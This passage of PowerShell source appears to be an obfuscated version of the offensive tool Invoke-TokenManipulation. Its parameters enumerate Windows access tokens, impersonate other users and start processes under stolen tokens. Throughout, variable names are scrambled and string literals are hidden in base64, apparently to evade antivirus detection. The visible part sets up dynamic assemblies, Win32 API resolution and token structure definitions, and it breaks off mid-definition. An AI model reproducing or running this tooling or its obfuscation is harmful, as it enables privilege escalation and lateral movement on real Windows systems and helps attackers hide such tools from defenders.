function Invoke-TokenManipulation
{
    [CmdletBinding(DefaultParameterSetName="Enumerate")]
    Param(
        [Parameter(ParameterSetName = "Enumerate")]
        [Switch]
        $Enumerate,
        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,
        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $ShowAll,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ImpersonateUser,
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $CreateProcess,
        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $Username,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,
        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,
        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $ThreadId,
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs,
        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $NoUI,
        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $PassThru
    )
    Set-StrictMode -Version 2
	Function _________/=\_/\_/\
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${___/=\____/\/==\_/} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${____/\_/\___/\_/=\} = [Void]
	    )
	    ${___/=\__/\_/==\_/} = [AppDomain]::CurrentDomain
	    ${_/\/\/\/====\_/==} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${/==\_/\_/=\/=\__/} = ${___/=\__/\_/==\_/}.DefineDynamicAssembly(${_/\/\/\/====\_/==}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${_/=\/\__/\___/==\} = ${/==\_/\_/=\/=\__/}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${____/\/==\__/\_/=} = ${/===\__/\_/\/==\/}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${___/=\____/\/==\_/})
	    ${____/\/==\__/\_/=}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${___/=\_/\_/=\_/==} = ${/===\__/\_/\/==\/}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${____/\_/\___/\_/=\}, ${___/=\____/\/==\_/})
	    ${___/=\_/\_/=\_/==}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${/===\__/\_/\/==\/}.CreateType()
	}
	Function __/\/\_/\____/\___
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${_/=\/=\_/\_/=\_/=\},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${__/===\/==\/=\____}
	    )
	    ${__/\/\/====\/==\_} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${__/\___/===\_/\/=} = ${__/\/\/====\/==\_}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${/==\_/=\/=\/\/\__} = ${__/\___/===\_/\/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${/=\/=\_/===\__/\/} = ${__/\___/===\_/\/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    ${___/==\/\___/=\_/} = ${/==\_/=\/=\/\/\__}.Invoke($null, @(${_/=\/=\_/\_/=\_/=\}))
	    ${__/==\/\/\_/====\} = New-Object IntPtr
	    ${/==\__/\_/==\_/=\} = New-Object System.Runtime.InteropServices.HandleRef(${__/==\/\/\_/====\}, ${___/==\/\___/=\_/})
	    echo ${/=\/=\_/===\__/\/}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${/==\__/\_/==\_/=\}, ${__/===\/==\/=\____}))
	}
    ${_/\_/====\_____/=} = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }
    ${__/==\/==\/\_/=\_} = New-Object PSObject -Property ${_/\_/====\_____/=}
	${___/=\__/\_/==\_/} = [AppDomain]::CurrentDomain
	${_/\____/==\___/\_} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
	${/==\_/\_/=\/=\__/} = ${___/=\__/\_/==\_/}.DefineDynamicAssembly(${_/\____/==\___/\_}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	${_/=\/\__/\___/==\} = ${/==\_/\_/=\/=\__/}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
	${_____/\__/=\_/\__} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOAF8AQwBMAEEAUwBTAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt32])
	${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUAcwBlAHIA'))), [UInt32] 1) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))), [UInt32] 2) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAHMA'))), [UInt32] 3) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE8AdwBuAGUAcgA='))), [UInt32] 4) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFAAcgBpAG0AYQByAHkARwByAG8AdQBwAA=='))), [UInt32] 5) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQBmAGEAdQBsAHQARABhAGMAbAA='))), [UInt32] 6) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAbwB1AHIAYwBlAA=='))), [UInt32] 7) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFQAeQBwAGUA'))), [UInt32] 8) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsAA=='))), [UInt32] 9) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAdABhAHQAaQBzAHQAaQBjAHMA'))), [UInt32] 10) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQAUwBpAGQAcwA='))), [UInt32] 11) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBzAHMAaQBvAG4ASQBkAA=='))), [UInt32] 12) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEcAcgBvAHUAcABzAEEAbgBkAFAAcgBpAHYAaQBsAGUAZwBlAHMA'))), [UInt32] 13) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBzAHMAaQBvAG4AUgBlAGYAZQByAGUAbgBjAGUA'))), [UInt32] 14) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAYQBuAGQAQgBvAHgASQBuAGUAcgB0AA=='))), [UInt32] 15) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAdQBkAGkAdABQAG8AbABpAGMAeQA='))), [UInt32] 16) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE8AcgBpAGcAaQBuAA=='))), [UInt32] 17) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuAFQAeQBwAGUA'))), [UInt32] 18) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEwAaQBuAGsAZQBkAFQAbwBrAGUAbgA='))), [UInt32] 19) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEUAbABlAHYAYQB0AGkAbwBuAA=='))), [UInt32] 20) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBzAFIAZQBzAHQAcgBpAGMAdABpAG8AbgBzAA=='))), [UInt32] 21) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAYwBjAGUAcwBzAEkAbgBmAG8AcgBtAGEAdABpAG8AbgA='))), [UInt32] 22) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFYAaQByAHQAdQBhAGwAaQB6AGEAdABpAG8AbgBBAGwAbABvAHcAZQBkAA=='))), [UInt32] 23) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFYAaQByAHQAdQBhAGwAaQB6AGEAdABpAG8AbgBFAG4AYQBiAGwAZQBkAA=='))), [UInt32] 24) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAbgB0AGUAZwByAGkAdAB5AEwAZQB2AGUAbAA='))), [UInt32] 25) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUASQBBAGMAYwBlAHMAcwA='))), [UInt32] 26) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAE0AYQBuAGQAYQB0AG8AcgB5AFAAbwBsAGkAYwB5AA=='))), [UInt32] 27) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEwAbwBnAG8AbgBTAGkAZAA='))), [UInt32] 28) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBBAHAAcABDAG8AbgB0AGEAaQBuAGUAcgA='))), [UInt32] 29) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEMAYQBwAGEAYgBpAGwAaQB0AGkAZQBzAA=='))), [UInt32] 30) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAcABwAEMAbwBuAHQAYQBpAG4AZQByAFMAaQBkAA=='))), [UInt32] 31) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEEAcABwAEMAbwBuAHQAYQBpAG4AZQByAE4AdQBtAGIAZQByAA=='))), [UInt32] 32) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFUAcwBlAHIAQwBsAGEAaQBtAEEAdAB0AHIAaQBiAHUAdABlAHMA'))), [UInt32] 33) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQB2AGkAYwBlAEMAbABhAGkAbQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))), [UInt32] 34) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQAVQBzAGUAcgBDAGwAYQBpAG0AQQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32] 35) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQARABlAHYAaQBjAGUAQwBsAGEAaQBtAEEAdAB0AHIAaQBiAHUAdABlAHMA'))), [UInt32] 36) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEQAZQB2AGkAYwBlAEcAcgBvAHUAcABzAA=='))), [UInt32] 37) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFIAZQBzAHQAcgBpAGMAdABlAGQARABlAHYAaQBjAGUARwByAG8AdQBwAHMA'))), [UInt32] 38) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFMAZQBjAHUAcgBpAHQAeQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))), [UInt32] 39) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBSAGUAcwB0AHIAaQBjAHQAZQBkAA=='))), [UInt32] 40) | Out-Null
    ${/===\__/\_/\/==\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAVABvAGsAZQBuAEkAbgBmAG8AQwBsAGEAcwBzAA=='))), [UInt32] 41) | Out-Null
	${___/\/====\_/\_/=} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABBAFIARwBFAF8ASQBOAFQARQBHAEUAUgA='))), ${_____/==\/\_/=\/\}, [System.ValueType], 8)
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${_/\_/\/====\/=\/\} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${_____/==\/\_/=\/\}, [System.ValueType], 8)
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/==\____/=\__/\__} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUwBUAEEAVABJAFMAVABJAEMAUwA='))), ${_____/==\/\_/=\/\}, [System.ValueType])
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAZAA='))), ${/==\____/=\__/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAEkAZAA='))), ${/==\____/=\__/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAaQByAGEAdABpAG8AbgBUAGkAbQBlAA=='))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAFQAeQBwAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBMAGUAdgBlAGwA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBDAGgAYQByAGcAZQBkAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHYAYQBpAGwAYQBiAGwAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEMAbwB1AG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAGkAZQBkAEkAZAA='))), ${/==\____/=\__/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${_/=\/\___/=\/\/\/} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAXwBVAE4ASQBDAE8ARABFAF8AUwBUAFIASQBOAEcA'))), ${_____/==\/\_/=\/\}, [System.ValueType])
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBMAGUAbgBnAHQAaAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${___/\___/\/\___/\} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAXwBMAEEAUwBUAF8ASQBOAFQARQBSAF8ATABPAEcATwBOAF8ASQBOAEYATwA='))), ${_____/==\/\_/=\/\}, [System.ValueType])
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABTAHUAYwBjAGUAcwBzAGYAdQBsAEwAbwBnAG8AbgA='))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABGAGEAaQBsAGUAZABMAG8AZwBvAG4A'))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAQQB0AHQAZQBtAHAAdABDAG8AdQBuAHQAUwBpAG4AYwBlAEwAYQBzAHQAUwB1AGMAYwBlAHMAcwBmAHUAbABMAG8AZwBvAG4A'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
